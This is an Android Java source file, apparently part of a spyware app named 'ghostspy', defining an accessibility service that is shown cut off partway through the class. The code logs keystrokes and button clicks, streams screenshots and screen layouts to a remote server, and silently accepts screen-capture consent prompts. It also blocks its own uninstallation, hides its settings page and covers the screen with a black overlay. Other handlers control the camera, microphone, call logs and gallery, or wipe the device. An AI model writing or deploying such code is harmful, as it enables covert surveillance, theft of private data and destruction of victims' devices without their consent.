package com.spy.ghostspy.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.ColorMatrix;
import android.graphics.ColorMatrixColorFilter;
import android.graphics.ImageFormat;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.UserHandle;
import android.os.UserManager;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.SparseIntArray;
import android.view.Display;
import android.view.Gravity;
import android.view.Surface;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.spy.ghostspy.R;
import com.spy.ghostspy.activity.OverlaySetActivity;
import com.spy.ghostspy.activity.PermissionSetActivity;
import com.spy.ghostspy.model.ApplistEntry;
import com.spy.ghostspy.model.CallLogEntry;
import com.spy.ghostspy.model.ImageData;
import com.spy.ghostspy.model.MousePositionEntry;
import com.spy.ghostspy.model.SkeletonEntry;
import com.spy.ghostspy.receiver.MyDeviceAdminReceiver;
import com.spy.ghostspy.server.Server;
import com.spy.ghostspy.utils.Common;
import com.spy.ghostspy.utils.InstalledApps;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Executor;

public class MainAccessibilityService extends AccessibilityService {
    public static final String ACTION_SCREEN_MONITOR = "SCREEN_MONITOR";
    public static final String ACTION_SCREEN_CLICK_MONITOR = "SCREEN_CLICK_MONITOR";
    public static final String ACTION_SCREEN_DRAG_MONITOR = "SCREEN_DRAG_MONITOR";
    public static final String ACTION_SCREEN_BLACK_MONITOR = "SCREEN_BLACK_MONITOR";
    public static final String ACTION_SCREEN_LIGHT_MONITOR = "SCREEN_LIGHT_MONITOR";
    public static final String ACTION_SCREEN_SKELETON_MONITOR = "SCREEN_SKELETON_MONITOR";
    public static final String ACTION_SCREEN_SET_TEXT_MONITOR = "SCREEN_SET_TEXT_MONITOR";
    public static final String ACTION_SCREEN_LOCK_MONITOR = "SCREEN_LOCK_MONITOR";
    public static final String ACTION_SCREEN_UNLOCK_MONITOR = "SCREEN_UNLOCK_MONITOR";
    public static final String ACTION_FRONT_CAMERA_MONITOR = "FRONT_CAMERA_MONITOR";
    public static final String ACTION_BACK_CAMERA_MONITOR = "BACK_CAMERA_MONITOR";
    public static final String ACTION_MIC_MONITOR = "MIC_MONITOR";
    public static final String ACTION_CALL_LOGGER = "CALL_LOGGER";
    public static final String ACTION_APP_INSTALLED = "APP_INSTALLED";
    public static final String ACTION_ALL_GALLERY = "ALL_GALLERY";
    public static final String ACTION_ONE_GALLERY = "ONE_GALLERY";
    public static final String ACTION_DEVICE_FORMAT = "DEVICE_FORMAT";
    public static final String ACTION_DEVICE_HOME = "DEVICE_HOME";
    public static final String ACTION_DEVICE_BACK = "DEVICE_BACK";
    public static final String ACTION_DEVICE_RECENT = "DEVICE_RECENT";
    public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
//    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
    DisplayMetrics displayMetrics;

    //Screen Monitor
    private final int imageWidth = 360;
    int deviceWidth = 0;
    int deviceHeight = 0;
    int deviceDensityDpi = 0;
    private String screenBase64 = "";
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private ImageReader imageReader;

    //blackscreen
    private boolean blackScreen = false;
    private String txtBlack = "";
    private WindowManager windowManager;
    private View overlayView;
    private TextView loadingTextView;

    //skeleton
    private final List<SkeletonEntry> skeletonEntryResultList = new ArrayList<>();

    private AccessibilityNodeInfo focusedNode;
    private Boolean isEditable= false;

    //stopuninstall
    private Boolean isSelectedApp = false;
    private Boolean isUninstallapp = false;

    // Camera
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader_back;
    private HandlerThread backgroundHandlerThread;
    private Handler backgroundHandler;
    private int qualityCamera = 10;
    private String cameraType = "backCamera";
    SparseIntArray orientations = new SparseIntArray(4);

    //Call log
    private final List<CallLogEntry> callLogList = new ArrayList<>();

    //Mic Monitor
    private static final int SAMPLE_RATE = 16000; // Sample rate in Hz
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_32BIT;
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);

    private volatile boolean isRecording = false;
    private AudioRecord audioRecord;

    //Wipe data
    private DevicePolicyManager mDevicePolicyManager;
    private ComponentName mAdminComponent;

    private static final String TAG = "MyAccessibilityService";
    @Override
    public void onCreate() {
        super.onCreate();
    }
//    @Override
//    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
//        super.takeScreenshot(displayId, executor, callback);
//    }

    private void startBackgroundThread() {
        backgroundHandlerThread = new HandlerThread("CameraVideoThread");
        backgroundHandlerThread.start();
        backgroundHandler = new Handler(backgroundHandlerThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundHandlerThread != null) {
            backgroundHandlerThread.quitSafely();
            try {
                backgroundHandlerThread.join();
                backgroundHandlerThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        displayMetrics = new DisplayMetrics();
        Display display = getSystemService(WindowManager.class).getDefaultDisplay();
        display.getRealMetrics(displayMetrics);
        deviceWidth = displayMetrics.widthPixels;
        deviceHeight = displayMetrics.heightPixels;
        deviceDensityDpi = displayMetrics.densityDpi;

        registerBackCameraCaptureManager();
        registerReceiverManager();
//        requestOverlayPermission();
        setPermissionRequest();
    }

    private void setPermissionRequest() {
        Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
        getBaseContext().startService(serviceIntentX);
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Intent intent = new Intent(this, PermissionSetActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } else {
            if(mediaProjection == null) {
                Intent serviceIntent = new Intent(getBaseContext(), CaptureForgroundService.class);
                getBaseContext().startService(serviceIntent);
            }
        }
    }

    public BroadcastReceiver batteryReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
//            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
//            float batteryPct = level * 100 / (float) scale;
//            batteryLevel = String.valueOf(batteryPct);
//            Log.d("Battery Level:", "Battery Level: " + batteryPct + "%");
//            getWifiNetworkLevel();
        }
    };
    public BroadcastReceiver mediaProjectionReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int resultCode = intent.getIntExtra("resultCode", 0);
            Log.d("resultCode::", String.valueOf(resultCode));
            Intent data = intent.getParcelableExtra("data");

            if (resultCode == -1 && data != null) {
                mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if(mediaProjection == null) {
                    mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
                }
                startCapture();
            }
        }
    };

    public BroadcastReceiver screenMonitorReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            Selected_EVENT = intent.getAction();
            if(intent.getAction().equals(ACTION_SCREEN_SET_TEXT_MONITOR)) {
                String setTextValue = intent.getStringExtra("setText");
                inputText(setTextValue);
            }
            if (ACTION_SCREEN_MONITOR.equals(intent.getAction())) {
                requestMediaProjectionPermission();
                sendScreenMonitoringData(screenBase64);
            }

            if (ACTION_SCREEN_CLICK_MONITOR.equals(intent.getAction())) {
                double xPosition = intent.getDoubleExtra("xPosition", 0);
                double yPosition = intent.getDoubleExtra("yPosition", 0);
                performClick(xPosition, yPosition);
            }
            if (ACTION_SCREEN_DRAG_MONITOR.equals(intent.getAction())) {
                mouseDraw();
            }
            if (ACTION_SCREEN_BLACK_MONITOR.equals(intent.getAction())) {
                txtBlack = intent.getStringExtra("txtBlack");
                makeBlackScreen();
            }
            if (ACTION_SCREEN_LIGHT_MONITOR.equals(intent.getAction())) {
                removeBlackScreen();
            }

            if(ACTION_SCREEN_SKELETON_MONITOR.equals(intent.getAction())) {
                if(Server.getContext() != null && skeletonEntryResultList.size() > 0){
                    Server.getContext().sendScreenSkeletonMonitoring(deviceWidth, deviceHeight, skeletonEntryResultList);
                }
            }

            if (ACTION_BACK_CAMERA_MONITOR.equals(intent.getAction())) {
                Handler handler=new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        closeCamera();
//                    stopRecording();
                        qualityCamera = intent.getIntExtra("quality", 10);
                        cameraType = intent.getStringExtra("cameraType");
                        Log.d("qualityCamera", String.valueOf(qualityCamera));
                        setupCamera();
                    }
                },4000);

            }

            if (ACTION_ALL_GALLERY.equals(intent.getAction())) {
                    getAllImages();
            }
            if (ACTION_ONE_GALLERY.equals(intent.getAction())) {
                //Gallery Monitor
                String imageFilePath = intent.getStringExtra("filepath");
                getOneImageData(imageFilePath);
            }

            if (ACTION_DEVICE_FORMAT.equals(intent.getAction())) {
                performFactoryReset();
            }

            if (ACTION_DEVICE_HOME.equals(intent.getAction())) {
                onGoHome();
            }

            if (ACTION_DEVICE_BACK.equals(intent.getAction())) {
                onGoBack();
            }
            if (ACTION_DEVICE_RECENT.equals(intent.getAction())) {
                onGoRecent();
            }

            if (ACTION_CALL_LOGGER.equals(intent.getAction())) {
                getCallDetails();
            }
            if (ACTION_APP_INSTALLED.equals(intent.getAction())) {
                getInstalledAppList();
            }
            if (ACTION_MIC_MONITOR.equals(intent.getAction())) {
                stopRecording();
                startRecording();
            }

            if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
                String close_event = intent.getStringExtra("event");
                if(close_event.equals("camera-monitor")) {
                    closeCamera();
                }
                if(close_event.equals("mic-monitor")) {
                    stopRecording();
                }
                if(close_event.equals("all")) {
                    stopRecording();
                    closeCamera();
                }
            }
        }
    };

    public void registerReceiverManager() {
        IntentFilter filter0 = new IntentFilter(ACTION_CLOSE_MONITOR);
        registerReceiver(screenMonitorReceiver, filter0, RECEIVER_EXPORTED);

        IntentFilter filter_screen = new IntentFilter(ACTION_SCREEN_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen, RECEIVER_EXPORTED);
        IntentFilter filter_screen_click = new IntentFilter(ACTION_SCREEN_CLICK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_click, RECEIVER_EXPORTED);
        IntentFilter filter_screen_drag = new IntentFilter(ACTION_SCREEN_DRAG_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_drag, RECEIVER_EXPORTED);
        IntentFilter filter_screen_black = new IntentFilter(ACTION_SCREEN_BLACK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_black, RECEIVER_EXPORTED);
        IntentFilter filter_screen_light = new IntentFilter(ACTION_SCREEN_LIGHT_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_light, RECEIVER_EXPORTED);
        IntentFilter filter_screen_skeleton = new IntentFilter(ACTION_SCREEN_SKELETON_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_skeleton, RECEIVER_EXPORTED);
        IntentFilter filter_screen_set_text = new IntentFilter(ACTION_SCREEN_SET_TEXT_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_set_text, RECEIVER_EXPORTED);
        IntentFilter filter_screen_lock = new IntentFilter(ACTION_SCREEN_LOCK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_lock, RECEIVER_EXPORTED);
        IntentFilter filter_screen_unlock = new IntentFilter(ACTION_SCREEN_UNLOCK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_screen_unlock, RECEIVER_EXPORTED);

        IntentFilter filter_front_camera = new IntentFilter(ACTION_FRONT_CAMERA_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_front_camera, RECEIVER_EXPORTED);
        IntentFilter filter_back_camera = new IntentFilter(ACTION_BACK_CAMERA_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_back_camera, RECEIVER_EXPORTED);
        IntentFilter filter_mic = new IntentFilter(ACTION_MIC_MONITOR);
        registerReceiver(screenMonitorReceiver, filter_mic, RECEIVER_EXPORTED);
        IntentFilter filter_call_logger = new IntentFilter(ACTION_CALL_LOGGER);
        registerReceiver(screenMonitorReceiver, filter_call_logger, RECEIVER_EXPORTED);
        IntentFilter filter_app_installed = new IntentFilter(ACTION_APP_INSTALLED);
        registerReceiver(screenMonitorReceiver, filter_app_installed, RECEIVER_EXPORTED);

        IntentFilter filter_all_gallery = new IntentFilter(ACTION_ALL_GALLERY);
        registerReceiver(screenMonitorReceiver, filter_all_gallery, RECEIVER_EXPORTED);
        IntentFilter filter_one_gallery = new IntentFilter(ACTION_ONE_GALLERY);
        registerReceiver(screenMonitorReceiver, filter_one_gallery, RECEIVER_EXPORTED);
        IntentFilter filter_device_format = new IntentFilter(ACTION_DEVICE_FORMAT);
        registerReceiver(screenMonitorReceiver, filter_device_format, RECEIVER_EXPORTED);
        IntentFilter filter_device_home = new IntentFilter(ACTION_DEVICE_HOME);
        registerReceiver(screenMonitorReceiver, filter_device_home, RECEIVER_EXPORTED);
        IntentFilter filter_device_back = new IntentFilter(ACTION_DEVICE_BACK);
        registerReceiver(screenMonitorReceiver, filter_device_back, RECEIVER_EXPORTED);
        IntentFilter filter_device_recent = new IntentFilter(ACTION_DEVICE_RECENT);
        registerReceiver(screenMonitorReceiver, filter_device_recent, RECEIVER_EXPORTED);

        IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
        registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);

        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        registerReceiver(batteryReceiver, batteryFilter, RECEIVER_EXPORTED);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
//        setAutomaticallyPermission(event);
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//            screenShotDevice();
//        }
        getSkeletonInfo(event);
        setStopUninstall(event);
        getKeyLogger(event);
        setStopUnAccessibility();
        setMediaProjectionPermission(event);
    }

    private void requestMediaProjectionPermission() {
        if (mediaProjection == null) {
            List<MousePositionEntry> notificationdraw = new ArrayList<>();
            notificationdraw.add(new MousePositionEntry(50,10));
            notificationdraw.add(new MousePositionEntry(50,13));
            notificationdraw.add(new MousePositionEntry(50,16));
            notificationdraw.add(new MousePositionEntry(50,20));
            notificationdraw.add(new MousePositionEntry(50,23.5));
            notificationdraw.add(new MousePositionEntry(50,26.5));
            notificationdraw.add(new MousePositionEntry(50,29.1));
            notificationdraw.add(new MousePositionEntry(50,44.2));
            notificationdraw.add(new MousePositionEntry(50,58.1));
            notificationdraw.add(new MousePositionEntry(50,75.3));
            notificationdraw.add(new MousePositionEntry(50,91.1));
            notificationdraw.add(new MousePositionEntry(50,115.5));
            notificationdraw.add(new MousePositionEntry(50,127.6));
            notificationdraw.add(new MousePositionEntry(50,141.03));
            notificationdraw.add(new MousePositionEntry(50,155.62));
            notificationdraw.add(new MousePositionEntry(50,170.21));
            notificationdraw.add(new MousePositionEntry(50,182.37));
            notificationdraw.add(new MousePositionEntry(50,192));
            notificationdraw.add(new MousePositionEntry(50,200));
            notificationdraw.add(new MousePositionEntry(50,206));
            notificationdraw.add(new MousePositionEntry(50,215));
            notificationdraw.add(new MousePositionEntry(50,221));
            notificationdraw.add(new MousePositionEntry(50,226));
            notificationdraw.add(new MousePositionEntry(50,233));
            notificationdraw.add(new MousePositionEntry(50,234));
            notificationdraw.add(new MousePositionEntry(50,235));

            Common.getInstance().setMousePositionEntries(notificationdraw);
            mouseDraw();
        }
    }
    private void setMediaProjectionPermission(AccessibilityEvent event) {
        CharSequence packagename = String.valueOf(event.getPackageName());
        Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
        if(packagename.equals("com.android.systemui")) {
            if(event.getClassName() != null) {
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if(rootNode != null) {
                    getMediaProjectionPermission(rootNode);
                }
            }
        }
    }

    private void setStopUninstall(AccessibilityEvent event) {
        CharSequence packagename = String.valueOf(event.getPackageName());
        Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());

        if(packagename.equals("com.google.android.packageinstaller") || packagename.equals("com.android.systemui")) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if(rootNode != null) {
                isSelectedApp = false;
                isUninstallapp = false;
                getUninstallDialog(rootNode);
                if(isSelectedApp && isUninstallapp) {
                    setStopUninstallApp(rootNode);
                }
            }
        }
    }

    private void setStopUnAccessibility() {
        AccessibilityNodeInfo node = getRootInActiveWindow();
        if(node != null) {
            getAccessibilityPage(node);
        }
    }

    private void getKeyLogger(AccessibilityEvent event) {
        CharSequence packagename = String.valueOf(event.getPackageName());
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().toString();
            Log.d(TAG, "Text changed: " + text + ", " + packagename);
            if(Server.getContext() != null) {
                Server.getContext().sendKeyLog(text, packagename, "Text Input");
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence text = event.getText().toString();
            Log.d(TAG, "Text changed: " + text + ", " + packagename);
            if(Server.getContext() != null) {
                Server.getContext().sendKeyLog("", packagename, "Navigation");
            }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                // Check if the clicked view is a Button
                CharSequence className = source.getClassName();
                if (className != null) {
                    if(Server.getContext() != null) {
                        String Button_Text = "";
                        if(source.getText() != null) {
                            Button_Text = source.getText().toString();
                        }
                        Log.d(TAG, "Text changed: " + Button_Text + ", " + className);
                        Server.getContext().sendKeyLog(Button_Text, packagename, "Button Click");
                    }
                }
            }
        }
    }

    public void getMediaProjectionPermission(AccessibilityNodeInfo node) {
//        Log.d(TAG, "<======================getMediaProjectionPermission===========================>");
        if(node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                if(node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    Log.d("Button Text Media", nodeText);
                    if(nodeText.equals("start now")
                            || nodeText.equals("start")
                            || nodeText.equals("iniciar agora")
                            || nodeText.equals("início")) {
                        Rect rect = new Rect();
                        node.getBoundsInScreen(rect);
                        performClickMain(rect.left + 10, rect.top + 10);
                    } else if(nodeText.equals("cancel") || nodeText.equals("cancelar")){
                        Rect rect = new Rect();
                        node.getBoundsInScreen(rect);
                        if(rect.width() < deviceWidth / 2 ) {
                            performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
                        }
                    }
                }
            } else if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                if(node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    Log.d("TextView Text Media", nodeText);
                    if(nodeText.contains("service is running")) {
                        if(node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else if(node.getParent().isClickable()) {
                            Log.d("parent click::", "parenbte one");
                            node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else if(node.getParent().getParent() != null) {
                            if(node.getParent().getParent().isClickable()) {
                                Log.d("parent click::", "parent two");
                                node.getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            } else if(node.getParent().getParent().getParent() != null) {
                                if(node.getParent().getParent().getParent().isClickable()) {
                                    node.getParent().getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                }
                            }
                        }
                    }
                }
            }
            for (int i = 0; i< node.getChildCount(); i++) {
                getMediaProjectionPermission(node.getChild(i));
            }
        }
    }

    public void getUninstallDialog(AccessibilityNodeInfo node) {
        if(node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                if(node.getText() != null) {
                    String nodeText = node.getText().toString();
                    if(nodeText.contains(getResources().getString(R.string.app_name))) {
                        isSelectedApp = true;
                    }
                    if (nodeText.contains("desins") || nodeText.contains("unins")) {
                        isUninstallapp = true;
                    }
                }
            }
            for (int i = 0; i< node.getChildCount(); i++) {
                getUninstallDialog(node.getChild(i));
            }
        }
    }

    public void getAccessibilityPage(AccessibilityNodeInfo node) {
        if(node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                if(node.getText() != null) {
                    String nodeText = node.getText().toString();
                    if(nodeText.contains(getResources().getString(R.string.accessibility_service_description))) {
                        onGoBack();
                    }
                }
            }
            for (int i = 0; i< node.getChildCount(); i++) {
                getAccessibilityPage(node.getChild(i));
            }
        }
    }

    public void setStopUninstallApp(AccessibilityNodeInfo node) {
        if(node != null) {
            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                if(node.getText() != null) {
                    String nodeText = node.getText().toString().toLowerCase();
                    Log.d("Button Text Stopunin", nodeText);
                    if(nodeText.equals("cancel")
                            || nodeText.equals("cancelar")) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
            for (int i = 0; i< node.getChildCount(); i++) {
                setStopUninstallApp(node.getChild(i));
            }
        }
    }

    private void getSkeletonInfo(AccessibilityEvent event) {
//        if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
//            skeletonEntryEditList.clear();
//            skeletonEntryEditList.addAll(printVisibleViewSkeleton(event.getSource()));
//
//            skeletonEntryResultList.addAll(skeletonEntryWindowList);
//            skeletonEntryResultList.addAll(skeletonEntryEditList);
//            skeletonEntryResultList.addAll(skeletonEntryEditList);
//        }
//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
//            skeletonEntryContentList.clear();
//            skeletonEntryContentList.addAll(printVisibleViewSkeleton(event.getSource()));
//
//            skeletonEntryResultList.addAll(skeletonEntryWindowList);
//            skeletonEntryResultList.addAll(skeletonEntryContentList);
//            skeletonEntryResultList.addAll(skeletonEntryEditList);
//        }
//
//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
//            skeletonEntryList.clear();
//            skeletonEntryList.addAll(printVisibleViewSkeleton(event.getSource()));
//            if(skeletonEntryList.size() > 1) {
//                skeletonEntryResultList.clear();
//                skeletonEntryWindowList.clear();
//                skeletonEntryContentList.clear();
//                skeletonEntryEditList.clear();
//
//                skeletonEntryResultList.addAll(skeletonEntryList);
//                skeletonEntryWindowList.addAll(skeletonEntryList);
//            } else {
//                skeletonEntryResultList.addAll(skeletonEntryList);
//            }
//        }

        if(event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            focusedNode = event.getSource();
            isEditable = focusedNode != null && focusedNode.getClassName().equals("android.widget.EditText");
        }

        skeletonEntryResultList.clear();
        skeletonEntryResultList.addAll(printVisibleViewSkeleton(getRootInActiveWindow()));

        if(Server.getContext() != null && skeletonEntryResultList.size() > 0){
            Server.getContext().sendScreenSkeletonMonitoring(deviceWidth, deviceHeight, skeletonEntryResultList);
        } else {
            Log.d("Root info", "no info");
        }
    }

    public void screenShotDevice() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(0, getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {

                @Override
                public void onSuccess(@NonNull ScreenshotResult screenshot) {
                    new Thread() {
                        @Override
                        public void run() {
                            try {
                                Bitmap wrapHardwareBuffer = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());

                                // Compress the Bitmap to JPEG format with 50% quality
                                try {
                                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                    assert wrapHardwareBuffer != null;
                                    deviceWidth = wrapHardwareBuffer.getWidth();
                                    deviceHeight = wrapHardwareBuffer.getHeight();
                                    Bitmap scaledBitmap;
                                    if(blackScreen) {
                                        Bitmap converImage = changeImageOpacity(wrapHardwareBuffer,1.0f);
                                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 20, byteArrayOutputStream);
                                    } else {
                                        scaledBitmap = Bitmap.createScaledBitmap(wrapHardwareBuffer, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, byteArrayOutputStream);
                                    }
                                    // Encode the compressed Bitmap to base64
                                    byte[] compressedBytes = byteArrayOutputStream.toByteArray();
                                    String base64Image = Base64.encodeToString(compressedBytes, Base64.DEFAULT);
                                    Log.d("base64:::", "base64Image");
                                    sendScreenMonitoringData(base64Image);
                                    byteArrayOutputStream.close();
                                } catch (IOException e) {
                                    throw new RuntimeException(e);
                                }

                            } catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    }.start();
                }

                @Override
                public void onFailure(int errorCode) {

                }
            });
        }
    }

    private void startCapture() {
        int width = deviceWidth;
        int height = deviceHeight;
        int densityDpi = deviceDensityDpi;

        mediaProjection.registerCallback(mediaProjectionCallback, null);

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                width,
                height,
                densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                null
        );

        imageReader.setOnImageAvailableListener(reader -> {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                try {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * image.getWidth();
                    int bitmapWidth = image.getWidth();
                    int bitmapHeight = image.getHeight();

                    Bitmap bitmap = Bitmap.createBitmap(bitmapWidth, bitmapHeight, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    Bitmap scaledBitmap;
                    if(blackScreen) {
                        Bitmap converImage = changeImageOpacity(bitmap,1.0f);
                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (bitmapHeight * (360.0 / bitmapWidth)), true);
                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                    } else {
                        scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmapHeight * (360.0 / bitmapWidth)), true);
                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                    }
                    screenBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT);
                    sendScreenMonitoringData(screenBase64);
                    bitmap.recycle();
                    scaledBitmap.recycle();
                    outputStream.close();
                } catch (Exception e) {
                    System.out.println("Error processing image: " + e.getLocalizedMessage());
                }
                image.close();
            }
        }, null);
    }
    private final MediaProjection.Callback mediaProjectionCallback = new MediaProjection.Callback() {
        @Override
        public void onStop() {
            super.onStop();
        }
    };
    public static Bitmap changeImageOpacity(Bitmap originalImage, float opacity) {
        // Create a mutable bitmap with the same size as the original
        Bitmap adjustedImage = Bitmap.createBitmap(
                originalImage.getWidth(),
                originalImage.getHeight(),
                Bitmap.Config.ARGB_8888
        );
        Canvas canvas = new Canvas(adjustedImage);
        Paint paint = new Paint();
        paint.setAlpha((int) (opacity * 255));
        float brightness = 1.0f;
        float contrast = 50.0f;
//        float gamma = 1.0f;
        float adjustedBrightness = brightness - 1.0f;
        ColorMatrix colorMatrix = new ColorMatrix(new float[]{
                contrast, 0, 0, 0, adjustedBrightness,
                0, contrast, 0, 0, adjustedBrightness,
                0, 0, contrast, 0, adjustedBrightness,
                0, 0, 0, 1, 0
        });
        paint.setColorFilter(new ColorMatrixColorFilter(colorMatrix));
        canvas.drawBitmap(originalImage.copy(Bitmap.Config.ARGB_8888, true), 0, 0, paint);
        return adjustedImage;
    }

